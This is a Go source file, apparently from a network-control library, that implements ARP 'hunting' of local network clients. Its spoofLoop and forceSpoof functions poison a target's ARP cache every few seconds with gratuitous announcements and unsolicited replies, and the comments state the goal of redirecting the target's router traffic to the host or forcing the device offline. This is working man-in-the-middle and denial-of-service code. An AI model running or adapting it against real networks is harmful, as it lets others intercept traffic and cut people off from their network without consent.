package arp

import (
	"fmt"
	"net"
	"time"

	"log"

	"github.com/irai/packet"
)

func (h *Handler) findHuntByIP(ip net.IP) (packet.Addr, bool) {
	for _, v := range h.huntList {
		if v.IP.Equal(ip) {
			return v, true
		}
	}
	return packet.Addr{}, false
}

// StartHunt implements PacketProcessor interface
//
// ARP StartHunt performs the following:
//  1. add addr to "hunt" list
//  2. start spoof goroutine to which will continuously spoof the client ARP table
//
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if addr.MAC == nil || addr.IP.To4() == nil {
		return packet.StageNoChange, packet.ErrInvalidIP
	}

	h.arpMutex.Lock()
	defer h.arpMutex.Unlock()
	if _, found := h.huntList[string(addr.MAC)]; found {
		return packet.StageHunt, nil
	}
	h.huntList[string(addr.MAC)] = addr

	fmt.Printf("arp   : start hunt %s\n", addr)
	go h.spoofLoop(addr)
	return packet.StageHunt, nil
}

// StopHunt implements PacketProcessor interface
// ARP StopHunt will remove the addr from the hunt list which will terminate the hunting goroutine
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	h.arpMutex.Lock()
	_, hunting := h.huntList[string(addr.MAC)]
	if hunting {
		delete(h.huntList, string(addr.MAC))
	}
	h.arpMutex.Unlock()
	if !hunting {
		fmt.Println("arp   : hunt stop failed - not in hunt stage", addr)
	}
	fmt.Println("arp   : stop hunt", addr)
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (h *Handler) spoofLoop(addr packet.Addr) {

	// 4 second re-arp seem to be adequate;
	// Experimented with 300ms but no noticeable improvement other the chatty net.
	ticker := time.NewTicker(time.Second * 4).C
	startTime := time.Now()
	nTimes := 0
	for {
		h.arpMutex.Lock()
		targetAddr, hunting := h.findHuntByIP(addr.IP)
		h.arpMutex.Unlock()

		if !hunting || h.closed {
			fmt.Printf("arp   : hunt loop stop %s repeat=%v duration=%v\n", addr, nTimes, time.Since(startTime))
			return
		}

		// Re-arp target to change router to host so all traffic comes to us
		// i.e. tell target I am 192.168.0.1
		//
		// Use virtual IP as it is guaranteed to not change.
		h.forceSpoof(targetAddr)

		if nTimes%16 == 0 {
			fmt.Printf("arp   : hunt loop attack %s repeat=%v duration=%s\n", targetAddr, nTimes, time.Since(startTime))
		}
		nTimes++

		select {
		case <-h.closeChan:
			return
		case <-ticker:
		}
	}
}

// forceSpoof send announcement and gratuitous ARP packet to spoof client MAC arp table to send router packets to
// host instead of the router
// i.e.  192.168.0.1->RouterMAC becames 192.168.0.1->HostMAC
//
// The client ARP table is refreshed often and only last for a short while (few minutes)
// hence the goroutine that re-arp clients
// To make sure the cache stays poisoned, replay every 5 seconds with a loop.
func (h *Handler) forceSpoof(addr packet.Addr) error {

	// Announce to target that we own the router IP
	// This will update the target arp table with our mac
	err := h.announce(addr.MAC, h.session.NICInfo.HostMAC, h.session.NICInfo.RouterIP4.IP, EthernetBroadcast, 2)
	if err != nil {
		log.Printf("arp error send announcement packet %s: %s", addr, err)
		return err
	}

	// Send 1 unsolicited ARP reply; clients may discard this
	for i := 0; i < 1; i++ {
		err = h.reply(addr.MAC, h.session.NICInfo.HostMAC, h.session.NICInfo.RouterIP4.IP, addr.MAC, addr.IP)
		if err != nil {
			log.Printf("arp error spoof client %s: %s", addr, err)
			return err
		}
		time.Sleep(time.Millisecond * 10)
	}

	return nil
}
